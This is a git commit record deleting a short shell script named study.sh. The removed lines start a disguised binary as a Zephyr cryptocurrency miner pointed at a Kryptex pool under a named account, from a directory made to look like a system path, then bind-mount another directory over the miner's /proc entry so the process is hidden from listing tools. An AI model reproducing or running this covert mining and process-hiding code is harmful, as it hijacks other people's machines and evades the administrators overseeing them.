61d1b0bee0db4fe5345172b19da357fae1757b80
Julia Randolph <149707732+JuliaRandolph@users.noreply.github.com>
2024-07-16 12:57:20 +0800

    Delete study.sh

--- study.sh
+++
@@ -1,3 +0,0 @@
-cd /etc/systmctl/discpu
-./tmpdth --coin zephyr --url "zeph.kryptex.network:8888" --user "snake9411@proton.me/10028" --tls -k -B
-mount -o bind /etc/discu /proc/`ps -ef | grep "tmpdth" | grep -v grep | awk '{print $2}'`
